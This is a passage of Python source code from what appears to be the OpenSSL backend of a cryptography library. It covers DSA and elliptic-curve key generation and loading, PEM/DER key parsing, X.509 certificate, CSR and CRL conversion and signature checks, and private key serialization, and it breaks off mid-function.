self._lib.DSAparams_dup(\r\n            parameters._dsa_cdata  # type: ignore[attr-defined]\r\n        )\r\n        self.openssl_assert(ctx != self._ffi.NULL)\r\n        ctx = self._ffi.gc(ctx, self._lib.DSA_free)\r\n        self._lib.DSA_generate_key(ctx)\r\n        evp_pkey = self._dsa_cdata_to_evp_pkey(ctx)\r\n\r\n        return _DSAPrivateKey(self, ctx, evp_pkey)\r\n\r\n    def generate_dsa_private_key_and_parameters(\r\n        self, key_size: int\r\n    ) -> dsa.DSAPrivateKey:\r\n        parameters = self.generate_dsa_parameters(key_size)\r\n        return self.generate_dsa_private_key(parameters)\r\n\r\n    def _dsa_cdata_set_values(self, dsa_cdata, p, q, g, pub_key, priv_key):\r\n        res = self._lib.DSA_set0_pqg(dsa_cdata, p, q, g)\r\n        self.openssl_assert(res == 1)\r\n        res = self._lib.DSA_set0_key(dsa_cdata, pub_key, priv_key)\r\n        self.openssl_assert(res == 1)\r\n\r\n    def load_dsa_private_numbers(\r\n        self, numbers: dsa.DSAPrivateNumbers\r\n    ) -> dsa.DSAPrivateKey:\r\n        dsa._check_dsa_private_numbers(numbers)\r\n        parameter_numbers = numbers.public_numbers.parameter_numbers\r\n\r\n        dsa_cdata = self._lib.DSA_new()\r\n        self.openssl_assert(dsa_cdata != self._ffi.NULL)\r\n        dsa_cdata = self._ffi.gc(dsa_cdata, self._lib.DSA_free)\r\n\r\n        p = self._int_to_bn(parameter_numbers.p)\r\n        q = self._int_to_bn(parameter_numbers.q)\r\n        g = self._int_to_bn(parameter_numbers.g)\r\n        pub_key = self._int_to_bn(numbers.public_numbers.y)\r\n        priv_key = self._int_to_bn(numbers.x)\r\n        self._dsa_cdata_set_values(dsa_cdata, p, q, g, pub_key, priv_key)\r\n\r\n        evp_pkey = self._dsa_cdata_to_evp_pkey(dsa_cdata)\r\n\r\n        return _DSAPrivateKey(self, dsa_cdata, evp_pkey)\r\n\r\n    def load_dsa_public_numbers(\r\n        self, numbers: dsa.DSAPublicNumbers\r\n    ) -> dsa.DSAPublicKey:\r\n        dsa._check_dsa_parameters(numbers.parameter_numbers)\r\n        dsa_cdata = self._lib.DSA_new()\r\n        self.openssl_assert(dsa_cdata != self._ffi.NULL)\r\n        dsa_cdata = self._ffi.gc(dsa_cdata, self._lib.DSA_free)\r\n\r\n        p = self._int_to_bn(numbers.parameter_numbers.p)\r\n        q = self._int_to_bn(numbers.parameter_numbers.q)\r\n        g = self._int_to_bn(numbers.parameter_numbers.g)\r\n        pub_key = self._int_to_bn(numbers.y)\r\n        priv_key = self._ffi.NULL\r\n        self._dsa_cdata_set_values(dsa_cdata, p, q, g, pub_key, priv_key)\r\n\r\n        evp_pkey = self._dsa_cdata_to_evp_pkey(dsa_cdata)\r\n\r\n        return _DSAPublicKey(self, dsa_cdata, evp_pkey)\r\n\r\n    def load_dsa_parameter_numbers(\r\n        self, numbers: dsa.DSAParameterNumbers\r\n    ) -> dsa.DSAParameters:\r\n        dsa._check_dsa_parameters(numbers)\r\n        dsa_cdata = self._lib.DSA_new()\r\n        self.openssl_assert(dsa_cdata != self._ffi.NULL)\r\n        dsa_cdata = self._ffi.gc(dsa_cdata, self._lib.DSA_free)\r\n\r\n        p = self._int_to_bn(numbers.p)\r\n        q = self._int_to_bn(numbers.q)\r\n        g = self._int_to_bn(numbers.g)\r\n        res = self._lib.DSA_set0_pqg(dsa_cdata, p, q, g)\r\n        self.openssl_assert(res == 1)\r\n\r\n        return _DSAParameters(self, dsa_cdata)\r\n\r\n    def _dsa_cdata_to_evp_pkey(self, dsa_cdata):\r\n        evp_pkey = self._create_evp_pkey_gc()\r\n        res = self._lib.EVP_PKEY_set1_DSA(evp_pkey, dsa_cdata)\r\n        self.openssl_assert(res == 1)\r\n        return evp_pkey\r\n\r\n    def dsa_supported(self) -> bool:\r\n        return not self._fips_enabled\r\n\r\n    def dsa_hash_supported(self, algorithm: hashes.HashAlgorithm) -> bool:\r\n        if not self.dsa_supported():\r\n            return False\r\n        return self.signature_hash_supported(algorithm)\r\n\r\n    def cmac_algorithm_supported(self, algorithm) -> bool:\r\n        return self.cipher_supported(\r\n            algorithm, CBC(b"\\x00" * algorithm.block_size)\r\n        )\r\n\r\n    def create_cmac_ctx(self, algorithm: BlockCipherAlgorithm) -> _CMACContext:\r\n        return _CMACContext(self, algorithm)\r\n\r\n    def load_pem_private_key(\r\n        self, data: bytes, password: typing.Optional[bytes]\r\n    ) -> PRIVATE_KEY_TYPES:\r\n        return self._load_key(\r\n            self._lib.PEM_read_bio_PrivateKey,\r\n            self._evp_pkey_to_private_key,\r\n            data,\r\n            password,\r\n        )\r\n\r\n    def load_pem_public_key(self, data: bytes) -> PUBLIC_KEY_TYPES:\r\n        mem_bio = self._bytes_to_bio(data)\r\n        # In OpenSSL 3.0.x the PEM_read_bio_PUBKEY function will invoke\r\n        # the default password callback if you pass an encrypted private\r\n        # key. This is very, very, very bad as the default callback can\r\n        # trigger an interactive console prompt, which will hang the\r\n        # Python process. We therefore provide our own callback to\r\n        # catch this and error out properly.\r\n        userdata = self._ffi.new("CRYPTOGRAPHY_PASSWORD_DATA *")\r\n        evp_pkey = self._lib.PEM_read_bio_PUBKEY(\r\n            mem_bio.bio,\r\n            self._ffi.NULL,\r\n            self._ffi.addressof(\r\n                self._lib._original_lib, "Cryptography_pem_password_cb"\r\n            ),\r\n            userdata,\r\n        )\r\n        if evp_pkey != self._ffi.NULL:\r\n            evp_pkey = self._ffi.gc(evp_pkey, self._lib.EVP_PKEY_free)\r\n            return self._evp_pkey_to_public_key(evp_pkey)\r\n        else:\r\n            # It\'s not a (RSA/DSA/ECDSA) subjectPublicKeyInfo, but we still\r\n            # need to check to see if it is a pure PKCS1 RSA public key (not\r\n            # embedded in a subjectPublicKeyInfo)\r\n            self._consume_errors()\r\n            res = self._lib.BIO_reset(mem_bio.bio)\r\n            self.openssl_assert(res == 1)\r\n            rsa_cdata = self._lib.PEM_read_bio_RSAPublicKey(\r\n                mem_bio.bio,\r\n                self._ffi.NULL,\r\n                self._ffi.addressof(\r\n                    self._lib._original_lib, "Cryptography_pem_password_cb"\r\n                ),\r\n                userdata,\r\n            )\r\n            if rsa_cdata != self._ffi.NULL:\r\n                rsa_cdata = self._ffi.gc(rsa_cdata, self._lib.RSA_free)\r\n                evp_pkey = self._rsa_cdata_to_evp_pkey(rsa_cdata)\r\n                return _RSAPublicKey(self, rsa_cdata, evp_pkey)\r\n            else:\r\n                self._handle_key_loading_error()\r\n\r\n    def load_pem_parameters(self, data: bytes) -> dh.DHParameters:\r\n        mem_bio = self._bytes_to_bio(data)\r\n        # only DH is supported currently\r\n        dh_cdata = self._lib.PEM_read_bio_DHparams(\r\n            mem_bio.bio, self._ffi.NULL, self._ffi.NULL, self._ffi.NULL\r\n        )\r\n        if dh_cdata != self._ffi.NULL:\r\n            dh_cdata = self._ffi.gc(dh_cdata, self._lib.DH_free)\r\n            return _DHParameters(self, dh_cdata)\r\n        else:\r\n            self._handle_key_loading_error()\r\n\r\n    def load_der_private_key(\r\n        self, data: bytes, password: typing.Optional[bytes]\r\n    ) -> PRIVATE_KEY_TYPES:\r\n        # OpenSSL has a function called d2i_AutoPrivateKey that in theory\r\n        # handles this automatically, however it doesn\'t handle encrypted\r\n        # private keys. Instead we try to load the key two different ways.\r\n        # First we\'ll try to load it as a traditional key.\r\n        bio_data = self._bytes_to_bio(data)\r\n        key = self._evp_pkey_from_der_traditional_key(bio_data, password)\r\n        if key:\r\n            return self._evp_pkey_to_private_key(key)\r\n        else:\r\n            # Finally we try to load it with the method that handles encrypted\r\n            # PKCS8 properly.\r\n            return self._load_key(\r\n                self._lib.d2i_PKCS8PrivateKey_bio,\r\n                self._evp_pkey_to_private_key,\r\n                data,\r\n                password,\r\n            )\r\n\r\n    def _evp_pkey_from_der_traditional_key(self, bio_data, password):\r\n        key = self._lib.d2i_PrivateKey_bio(bio_data.bio, self._ffi.NULL)\r\n        if key != self._ffi.NULL:\r\n            # In OpenSSL 3.0.0-alpha15 there exist scenarios where the key will\r\n            # successfully load but errors are still put on the stack. Tracked\r\n            # as https://github.com/openssl/openssl/issues/14996\r\n            self._consume_errors()\r\n\r\n            key = self._ffi.gc(key, self._lib.EVP_PKEY_free)\r\n            if password is not None:\r\n                raise TypeError(\r\n                    "Password was given but private key is not encrypted."\r\n                )\r\n\r\n            return key\r\n        else:\r\n            self._consume_errors()\r\n            return None\r\n\r\n    def load_der_public_key(self, data: bytes) -> PUBLIC_KEY_TYPES:\r\n        mem_bio = self._bytes_to_bio(data)\r\n        evp_pkey = self._lib.d2i_PUBKEY_bio(mem_bio.bio, self._ffi.NULL)\r\n        if evp_pkey != self._ffi.NULL:\r\n            evp_pkey = self._ffi.gc(evp_pkey, self._lib.EVP_PKEY_free)\r\n            return self._evp_pkey_to_public_key(evp_pkey)\r\n        else:\r\n            # It\'s not a (RSA/DSA/ECDSA) subjectPublicKeyInfo, but we still\r\n            # need to check to see if it is a pure PKCS1 RSA public key (not\r\n            # embedded in a subjectPublicKeyInfo)\r\n            self._consume_errors()\r\n            res = self._lib.BIO_reset(mem_bio.bio)\r\n            self.openssl_assert(res == 1)\r\n            rsa_cdata = self._lib.d2i_RSAPublicKey_bio(\r\n                mem_bio.bio, self._ffi.NULL\r\n            )\r\n            if rsa_cdata != self._ffi.NULL:\r\n                rsa_cdata = self._ffi.gc(rsa_cdata, self._lib.RSA_free)\r\n                evp_pkey = self._rsa_cdata_to_evp_pkey(rsa_cdata)\r\n                return _RSAPublicKey(self, rsa_cdata, evp_pkey)\r\n            else:\r\n                self._handle_key_loading_error()\r\n\r\n    def load_der_parameters(self, data: bytes) -> dh.DHParameters:\r\n        mem_bio = self._bytes_to_bio(data)\r\n        dh_cdata = self._lib.d2i_DHparams_bio(mem_bio.bio, self._ffi.NULL)\r\n        if dh_cdata != self._ffi.NULL:\r\n            dh_cdata = self._ffi.gc(dh_cdata, self._lib.DH_free)\r\n            return _DHParameters(self, dh_cdata)\r\n        elif self._lib.Cryptography_HAS_EVP_PKEY_DHX:\r\n            # We check to see if the is dhx.\r\n            self._consume_errors()\r\n            res = self._lib.BIO_reset(mem_bio.bio)\r\n            self.openssl_assert(res == 1)\r\n            dh_cdata = self._lib.Cryptography_d2i_DHxparams_bio(\r\n                mem_bio.bio, self._ffi.NULL\r\n            )\r\n            if dh_cdata != self._ffi.NULL:\r\n                dh_cdata = self._ffi.gc(dh_cdata, self._lib.DH_free)\r\n                return _DHParameters(self, dh_cdata)\r\n\r\n        self._handle_key_loading_error()\r\n\r\n    def _cert2ossl(self, cert: x509.Certificate) -> typing.Any:\r\n        data = cert.public_bytes(serialization.Encoding.DER)\r\n        mem_bio = self._bytes_to_bio(data)\r\n        x509 = self._lib.d2i_X509_bio(mem_bio.bio, self._ffi.NULL)\r\n        self.openssl_assert(x509 != self._ffi.NULL)\r\n        x509 = self._ffi.gc(x509, self._lib.X509_free)\r\n        return x509\r\n\r\n    def _ossl2cert(self, x509: typing.Any) -> x509.Certificate:\r\n        bio = self._create_mem_bio_gc()\r\n        res = self._lib.i2d_X509_bio(bio, x509)\r\n        self.openssl_assert(res == 1)\r\n        return rust_x509.load_der_x509_certificate(self._read_mem_bio(bio))\r\n\r\n    def _csr2ossl(self, csr: x509.CertificateSigningRequest) -> typing.Any:\r\n        data = csr.public_bytes(serialization.Encoding.DER)\r\n        mem_bio = self._bytes_to_bio(data)\r\n        x509_req = self._lib.d2i_X509_REQ_bio(mem_bio.bio, self._ffi.NULL)\r\n        self.openssl_assert(x509_req != self._ffi.NULL)\r\n        x509_req = self._ffi.gc(x509_req, self._lib.X509_REQ_free)\r\n        return x509_req\r\n\r\n    def _ossl2csr(\r\n        self, x509_req: typing.Any\r\n    ) -> x509.CertificateSigningRequest:\r\n        bio = self._create_mem_bio_gc()\r\n        res = self._lib.i2d_X509_REQ_bio(bio, x509_req)\r\n        self.openssl_assert(res == 1)\r\n        return rust_x509.load_der_x509_csr(self._read_mem_bio(bio))\r\n\r\n    def _crl2ossl(self, crl: x509.CertificateRevocationList) -> typing.Any:\r\n        data = crl.public_bytes(serialization.Encoding.DER)\r\n        mem_bio = self._bytes_to_bio(data)\r\n        x509_crl = self._lib.d2i_X509_CRL_bio(mem_bio.bio, self._ffi.NULL)\r\n        self.openssl_assert(x509_crl != self._ffi.NULL)\r\n        x509_crl = self._ffi.gc(x509_crl, self._lib.X509_CRL_free)\r\n        return x509_crl\r\n\r\n    def _ossl2crl(\r\n        self, x509_crl: typing.Any\r\n    ) -> x509.CertificateRevocationList:\r\n        bio = self._create_mem_bio_gc()\r\n        res = self._lib.i2d_X509_CRL_bio(bio, x509_crl)\r\n        self.openssl_assert(res == 1)\r\n        return rust_x509.load_der_x509_crl(self._read_mem_bio(bio))\r\n\r\n    def _crl_is_signature_valid(\r\n        self,\r\n        crl: x509.CertificateRevocationList,\r\n        public_key: CERTIFICATE_ISSUER_PUBLIC_KEY_TYPES,\r\n    ) -> bool:\r\n        if not isinstance(\r\n            public_key,\r\n            (\r\n                _DSAPublicKey,\r\n                _RSAPublicKey,\r\n                _EllipticCurvePublicKey,\r\n            ),\r\n        ):\r\n            raise TypeError(\r\n                "Expecting one of DSAPublicKey, RSAPublicKey,"\r\n                " or EllipticCurvePublicKey."\r\n            )\r\n        x509_crl = self._crl2ossl(crl)\r\n        res = self._lib.X509_CRL_verify(x509_crl, public_key._evp_pkey)\r\n\r\n        if res != 1:\r\n            self._consume_errors()\r\n            return False\r\n\r\n        return True\r\n\r\n    def _csr_is_signature_valid(\r\n        self, csr: x509.CertificateSigningRequest\r\n    ) -> bool:\r\n        x509_req = self._csr2ossl(csr)\r\n        pkey = self._lib.X509_REQ_get_pubkey(x509_req)\r\n        self.openssl_assert(pkey != self._ffi.NULL)\r\n        pkey = self._ffi.gc(pkey, self._lib.EVP_PKEY_free)\r\n        res = self._lib.X509_REQ_verify(x509_req, pkey)\r\n\r\n        if res != 1:\r\n            self._consume_errors()\r\n            return False\r\n\r\n        return True\r\n\r\n    def _check_keys_correspond(self, key1, key2):\r\n        if self._lib.EVP_PKEY_cmp(key1._evp_pkey, key2._evp_pkey) != 1:\r\n            raise ValueError("Keys do not correspond")\r\n\r\n    def _load_key(self, openssl_read_func, convert_func, data, password):\r\n        mem_bio = self._bytes_to_bio(data)\r\n\r\n        userdata = self._ffi.new("CRYPTOGRAPHY_PASSWORD_DATA *")\r\n        if password is not None:\r\n            utils._check_byteslike("password", password)\r\n            password_ptr = self._ffi.from_buffer(password)\r\n            userdata.password = password_ptr\r\n            userdata.length = len(password)\r\n\r\n        evp_pkey = openssl_read_func(\r\n            mem_bio.bio,\r\n            self._ffi.NULL,\r\n            self._ffi.addressof(\r\n                self._lib._original_lib, "Cryptography_pem_password_cb"\r\n            ),\r\n            userdata,\r\n        )\r\n\r\n        if evp_pkey == self._ffi.NULL:\r\n            if userdata.error != 0:\r\n                self._consume_errors()\r\n                if userdata.error == -1:\r\n                    raise TypeError(\r\n                        "Password was not given but private key is encrypted"\r\n                    )\r\n                else:\r\n                    assert userdata.error == -2\r\n                    raise ValueError(\r\n                        "Passwords longer than {} bytes are not supported "\r\n                        "by this backend.".format(userdata.maxsize - 1)\r\n                    )\r\n            else:\r\n                self._handle_key_loading_error()\r\n\r\n        # In OpenSSL 3.0.0-alpha15 there exist scenarios where the key will\r\n        # successfully load but errors are still put on the stack. Tracked\r\n        # as https://github.com/openssl/openssl/issues/14996\r\n        self._consume_errors()\r\n\r\n        evp_pkey = self._ffi.gc(evp_pkey, self._lib.EVP_PKEY_free)\r\n\r\n        if password is not None and userdata.called == 0:\r\n            raise TypeError(\r\n                "Password was given but private key is not encrypted."\r\n            )\r\n\r\n        assert (\r\n            password is not None and userdata.called == 1\r\n        ) or password is None\r\n\r\n        return convert_func(evp_pkey)\r\n\r\n    def _handle_key_loading_error(self) -> typing.NoReturn:\r\n        errors = self._consume_errors()\r\n\r\n        if not errors:\r\n            raise ValueError(\r\n                "Could not deserialize key data. The data may be in an "\r\n                "incorrect format or it may be encrypted with an unsupported "\r\n                "algorithm."\r\n            )\r\n\r\n        elif (\r\n            errors[0]._lib_reason_match(\r\n                self._lib.ERR_LIB_EVP, self._lib.EVP_R_BAD_DECRYPT\r\n            )\r\n            or errors[0]._lib_reason_match(\r\n                self._lib.ERR_LIB_PKCS12,\r\n                self._lib.PKCS12_R_PKCS12_CIPHERFINAL_ERROR,\r\n            )\r\n            or (\r\n                self._lib.Cryptography_HAS_PROVIDERS\r\n                and errors[0]._lib_reason_match(\r\n                    self._lib.ERR_LIB_PROV,\r\n                    self._lib.PROV_R_BAD_DECRYPT,\r\n                )\r\n            )\r\n        ):\r\n            raise ValueError("Bad decrypt. Incorrect password?")\r\n\r\n        elif any(\r\n            error._lib_reason_match(\r\n                self._lib.ERR_LIB_EVP,\r\n                self._lib.EVP_R_UNSUPPORTED_PRIVATE_KEY_ALGORITHM,\r\n            )\r\n            for error in errors\r\n        ):\r\n            raise ValueError("Unsupported public key algorithm.")\r\n\r\n        else:\r\n            errors_with_text = binding._errors_with_text(errors)\r\n            raise ValueError(\r\n                "Could not deserialize key data. The data may be in an "\r\n                "incorrect format, it may be encrypted with an unsupported "\r\n                "algorithm, or it may be an unsupported key type (e.g. EC "\r\n                "curves with explicit parameters).",\r\n                errors_with_text,\r\n            )\r\n\r\n    def elliptic_curve_supported(self, curve: ec.EllipticCurve) -> bool:\r\n        try:\r\n            curve_nid = self._elliptic_curve_to_nid(curve)\r\n        except UnsupportedAlgorithm:\r\n            curve_nid = self._lib.NID_undef\r\n\r\n        group = self._lib.EC_GROUP_new_by_curve_name(curve_nid)\r\n\r\n        if group == self._ffi.NULL:\r\n            self._consume_errors()\r\n            return False\r\n        else:\r\n            self.openssl_assert(curve_nid != self._lib.NID_undef)\r\n            self._lib.EC_GROUP_free(group)\r\n            return True\r\n\r\n    def elliptic_curve_signature_algorithm_supported(\r\n        self,\r\n        signature_algorithm: ec.EllipticCurveSignatureAlgorithm,\r\n        curve: ec.EllipticCurve,\r\n    ) -> bool:\r\n        # We only support ECDSA right now.\r\n        if not isinstance(signature_algorithm, ec.ECDSA):\r\n            return False\r\n\r\n        return self.elliptic_curve_supported(curve)\r\n\r\n    def generate_elliptic_curve_private_key(\r\n        self, curve: ec.EllipticCurve\r\n    ) -> ec.EllipticCurvePrivateKey:\r\n        """\r\n        Generate a new private key on the named curve.\r\n        """\r\n\r\n        if self.elliptic_curve_supported(curve):\r\n            ec_cdata = self._ec_key_new_by_curve(curve)\r\n\r\n            res = self._lib.EC_KEY_generate_key(ec_cdata)\r\n            self.openssl_assert(res == 1)\r\n\r\n            evp_pkey = self._ec_cdata_to_evp_pkey(ec_cdata)\r\n\r\n            return _EllipticCurvePrivateKey(self, ec_cdata, evp_pkey)\r\n        else:\r\n            raise UnsupportedAlgorithm(\r\n                "Backend object does not support {}.".format(curve.name),\r\n                _Reasons.UNSUPPORTED_ELLIPTIC_CURVE,\r\n            )\r\n\r\n    def load_elliptic_curve_private_numbers(\r\n        self, numbers: ec.EllipticCurvePrivateNumbers\r\n    ) -> ec.EllipticCurvePrivateKey:\r\n        public = numbers.public_numbers\r\n\r\n        ec_cdata = self._ec_key_new_by_curve(public.curve)\r\n\r\n        private_value = self._ffi.gc(\r\n            self._int_to_bn(numbers.private_value), self._lib.BN_clear_free\r\n        )\r\n        res = self._lib.EC_KEY_set_private_key(ec_cdata, private_value)\r\n        if res != 1:\r\n            self._consume_errors()\r\n            raise ValueError("Invalid EC key.")\r\n\r\n        self._ec_key_set_public_key_affine_coordinates(\r\n            ec_cdata, public.x, public.y\r\n        )\r\n\r\n        evp_pkey = self._ec_cdata_to_evp_pkey(ec_cdata)\r\n\r\n        return _EllipticCurvePrivateKey(self, ec_cdata, evp_pkey)\r\n\r\n    def load_elliptic_curve_public_numbers(\r\n        self, numbers: ec.EllipticCurvePublicNumbers\r\n    ) -> ec.EllipticCurvePublicKey:\r\n        ec_cdata = self._ec_key_new_by_curve(numbers.curve)\r\n        self._ec_key_set_public_key_affine_coordinates(\r\n            ec_cdata, numbers.x, numbers.y\r\n        )\r\n        evp_pkey = self._ec_cdata_to_evp_pkey(ec_cdata)\r\n\r\n        return _EllipticCurvePublicKey(self, ec_cdata, evp_pkey)\r\n\r\n    def load_elliptic_curve_public_bytes(\r\n        self, curve: ec.EllipticCurve, point_bytes: bytes\r\n    ) -> ec.EllipticCurvePublicKey:\r\n        ec_cdata = self._ec_key_new_by_curve(curve)\r\n        group = self._lib.EC_KEY_get0_group(ec_cdata)\r\n        self.openssl_assert(group != self._ffi.NULL)\r\n        point = self._lib.EC_POINT_new(group)\r\n        self.openssl_assert(point != self._ffi.NULL)\r\n        point = self._ffi.gc(point, self._lib.EC_POINT_free)\r\n        with self._tmp_bn_ctx() as bn_ctx:\r\n            res = self._lib.EC_POINT_oct2point(\r\n                group, point, point_bytes, len(point_bytes), bn_ctx\r\n            )\r\n            if res != 1:\r\n                self._consume_errors()\r\n                raise ValueError("Invalid public bytes for the given curve")\r\n\r\n        res = self._lib.EC_KEY_set_public_key(ec_cdata, point)\r\n        self.openssl_assert(res == 1)\r\n        evp_pkey = self._ec_cdata_to_evp_pkey(ec_cdata)\r\n        return _EllipticCurvePublicKey(self, ec_cdata, evp_pkey)\r\n\r\n    def derive_elliptic_curve_private_key(\r\n        self, private_value: int, curve: ec.EllipticCurve\r\n    ) -> ec.EllipticCurvePrivateKey:\r\n        ec_cdata = self._ec_key_new_by_curve(curve)\r\n\r\n        get_func, group = self._ec_key_determine_group_get_func(ec_cdata)\r\n\r\n        point = self._lib.EC_POINT_new(group)\r\n        self.openssl_assert(point != self._ffi.NULL)\r\n        point = self._ffi.gc(point, self._lib.EC_POINT_free)\r\n\r\n        value = self._int_to_bn(private_value)\r\n        value = self._ffi.gc(value, self._lib.BN_clear_free)\r\n\r\n        with self._tmp_bn_ctx() as bn_ctx:\r\n            res = self._lib.EC_POINT_mul(\r\n                group, point, value, self._ffi.NULL, self._ffi.NULL, bn_ctx\r\n            )\r\n            self.openssl_assert(res == 1)\r\n\r\n            bn_x = self._lib.BN_CTX_get(bn_ctx)\r\n            bn_y = self._lib.BN_CTX_get(bn_ctx)\r\n\r\n            res = get_func(group, point, bn_x, bn_y, bn_ctx)\r\n            if res != 1:\r\n                self._consume_errors()\r\n                raise ValueError("Unable to derive key from private_value")\r\n\r\n        res = self._lib.EC_KEY_set_public_key(ec_cdata, point)\r\n        self.openssl_assert(res == 1)\r\n        private = self._int_to_bn(private_value)\r\n        private = self._ffi.gc(private, self._lib.BN_clear_free)\r\n        res = self._lib.EC_KEY_set_private_key(ec_cdata, private)\r\n        self.openssl_assert(res == 1)\r\n\r\n        evp_pkey = self._ec_cdata_to_evp_pkey(ec_cdata)\r\n\r\n        return _EllipticCurvePrivateKey(self, ec_cdata, evp_pkey)\r\n\r\n    def _ec_key_new_by_curve(self, curve: ec.EllipticCurve):\r\n        curve_nid = self._elliptic_curve_to_nid(curve)\r\n        return self._ec_key_new_by_curve_nid(curve_nid)\r\n\r\n    def _ec_key_new_by_curve_nid(self, curve_nid: int):\r\n        ec_cdata = self._lib.EC_KEY_new_by_curve_name(curve_nid)\r\n        self.openssl_assert(ec_cdata != self._ffi.NULL)\r\n        return self._ffi.gc(ec_cdata, self._lib.EC_KEY_free)\r\n\r\n    def elliptic_curve_exchange_algorithm_supported(\r\n        self, algorithm: ec.ECDH, curve: ec.EllipticCurve\r\n    ) -> bool:\r\n        if self._fips_enabled and not isinstance(\r\n            curve, self._fips_ecdh_curves\r\n        ):\r\n            return False\r\n\r\n        return self.elliptic_curve_supported(curve) and isinstance(\r\n            algorithm, ec.ECDH\r\n        )\r\n\r\n    def _ec_cdata_to_evp_pkey(self, ec_cdata):\r\n        evp_pkey = self._create_evp_pkey_gc()\r\n        res = self._lib.EVP_PKEY_set1_EC_KEY(evp_pkey, ec_cdata)\r\n        self.openssl_assert(res == 1)\r\n        return evp_pkey\r\n\r\n    def _elliptic_curve_to_nid(self, curve: ec.EllipticCurve) -> int:\r\n        """\r\n        Get the NID for a curve name.\r\n        """\r\n\r\n        curve_aliases = {"secp192r1": "prime192v1", "secp256r1": "prime256v1"}\r\n\r\n        curve_name = curve_aliases.get(curve.name, curve.name)\r\n\r\n        curve_nid = self._lib.OBJ_sn2nid(curve_name.encode())\r\n        if curve_nid == self._lib.NID_undef:\r\n            raise UnsupportedAlgorithm(\r\n                "{} is not a supported elliptic curve".format(curve.name),\r\n                _Reasons.UNSUPPORTED_ELLIPTIC_CURVE,\r\n            )\r\n        return curve_nid\r\n\r\n    @contextmanager\r\n    def _tmp_bn_ctx(self):\r\n        bn_ctx = self._lib.BN_CTX_new()\r\n        self.openssl_assert(bn_ctx != self._ffi.NULL)\r\n        bn_ctx = self._ffi.gc(bn_ctx, self._lib.BN_CTX_free)\r\n        self._lib.BN_CTX_start(bn_ctx)\r\n        try:\r\n            yield bn_ctx\r\n        finally:\r\n            self._lib.BN_CTX_end(bn_ctx)\r\n\r\n    def _ec_key_determine_group_get_func(self, ctx):\r\n        """\r\n        Given an EC_KEY determine the group and what function is required to\r\n        get point coordinates.\r\n        """\r\n        self.openssl_assert(ctx != self._ffi.NULL)\r\n\r\n        nid_two_field = self._lib.OBJ_sn2nid(b"characteristic-two-field")\r\n        self.openssl_assert(nid_two_field != self._lib.NID_undef)\r\n\r\n        group = self._lib.EC_KEY_get0_group(ctx)\r\n        self.openssl_assert(group != self._ffi.NULL)\r\n\r\n        method = self._lib.EC_GROUP_method_of(group)\r\n        self.openssl_assert(method != self._ffi.NULL)\r\n\r\n        nid = self._lib.EC_METHOD_get_field_type(method)\r\n        self.openssl_assert(nid != self._lib.NID_undef)\r\n\r\n        if nid == nid_two_field and self._lib.Cryptography_HAS_EC2M:\r\n            get_func = self._lib.EC_POINT_get_affine_coordinates_GF2m\r\n        else:\r\n            get_func = self._lib.EC_POINT_get_affine_coordinates_GFp\r\n\r\n        assert get_func\r\n\r\n        return get_func, group\r\n\r\n    def _ec_key_set_public_key_affine_coordinates(self, ctx, x: int, y: int):\r\n        """\r\n        Sets the public key point in the EC_KEY context to the affine x and y\r\n        values.\r\n        """\r\n\r\n        if x < 0 or y < 0:\r\n            raise ValueError(\r\n                "Invalid EC key. Both x and y must be non-negative."\r\n            )\r\n\r\n        x = self._ffi.gc(self._int_to_bn(x), self._lib.BN_free)\r\n        y = self._ffi.gc(self._int_to_bn(y), self._lib.BN_free)\r\n        res = self._lib.EC_KEY_set_public_key_affine_coordinates(ctx, x, y)\r\n        if res != 1:\r\n            self._consume_errors()\r\n            raise ValueError("Invalid EC key.")\r\n\r\n    def _private_key_bytes(\r\n        self,\r\n        encoding: serialization.Encoding,\r\n        format: serialization.PrivateFormat,\r\n        encryption_algorithm: serialization.KeySerializationEncryption,\r\n        key,\r\n        evp_pkey,\r\n        cdata,\r\n    ) -> bytes:\r\n        # validate argument types\r\n        if not isinstance(encoding, serialization.Encoding):\r\n            raise TypeError("encoding must be an item from the Encoding enum")\r\n        if not isinstance(format, serialization.PrivateFormat):\r\n            raise TypeError(\r\n                "format must be an item from the PrivateFormat enum"\r\n            )\r\n        if not isinstance(\r\n            encryption_algorithm, serialization.KeySerializationEncryption\r\n        ):\r\n            raise TypeError(\r\n                "Encryption algorithm must be a KeySerializationEncryption "\r\n                "instance"\r\n            )\r\n\r\n        # validate password\r\n        if isinstance(encryption_algorithm, serialization.NoEncryption):\r\n            password = b""\r\n        elif isinstance(\r\n            encryption_algorithm, serialization.BestAvailableEncryption\r\n        ):\r\n            password = encryption_algorithm.password\r\n            if len(password) > 1023:\r\n                raise ValueError(\r\n                    "Passwords longer than 1023 bytes are not supported by "\r\n                    "this backend"\r\n                )\r\n        else:\r\n            raise ValueError("Unsupported encryption type")\r\n\r\n        # PKCS8 + PEM/DER\r\n        if format is serialization.PrivateFormat.PKCS8:\r\n            if encoding is serialization.Encoding.PEM:\r\n                write_bio = self._lib.PEM_write_bio_PKCS8PrivateKey\r\n            elif encoding is serialization.Encoding.DER:\r\n                write_bio = self._lib.i2d_PKCS8PrivateKey_bio\r\n            else:\r\n                raise ValueError("Unsupported encoding for PKCS8")\r\n            return self._private_key_bytes_via_bio(\r\n                write_bio, evp_pkey, password\r\n            )\r\n\r\n        # TraditionalOpenSSL + PEM/DER\r\n        if format is serialization.PrivateFormat.TraditionalOpenSSL:\r\n            if self._fips_enabled and not isinstance(\r\n                encryption_algorithm, serialization.NoEncryption\r\n            ):\r\n                raise ValueError(\r\n                    "Encrypted traditional OpenSSL format is not "\r\n                    "supported in FIPS mode."\r\n                )\r\n            key_type = self._lib.EVP_PKEY_id(evp_pkey)\r\n\r\n            if encoding is serialization.Encoding.PEM:\r\n                if key_type == self._lib.EVP_PKEY_RSA:\r\n                    write_bio = self._lib.PEM_write_bio_RSAPrivateKey\r\n                elif key_type == self._lib.EVP_PKEY_DSA:\r\n                    write_bio = self._lib.PEM_write_bio_DSAPrivateKey\r\n                elif key_type == self._lib.EVP_PKEY_EC:\r\n                    write_bio = self._lib.PEM_write_bio_ECPrivateKey\r\n                else:\r\n                    raise ValueError(\r\n                        "Unsupported key type for TraditionalOpenSSL"\r\n                    )\r\n                return self._private_key_bytes_via_bio(\r\n                    write_bio, cdata, password\r\n                )\r\n\r\n            if encoding is serialization.Encoding.DER:\r\n                if password:\r\n                    raise ValueError(\r\n                        "Encryption is not supported for DER encoded "\r\n                        "traditional OpenSSL keys"\r\n                    )\r\n                if key_type == self._lib.EVP_PKEY_RSA:\r\n                    write_bio = self._lib.i2d_RSAPrivateKey_bio\r\n                elif key_type == self._lib.EVP_PKEY_EC:\r\n                    write_bio = 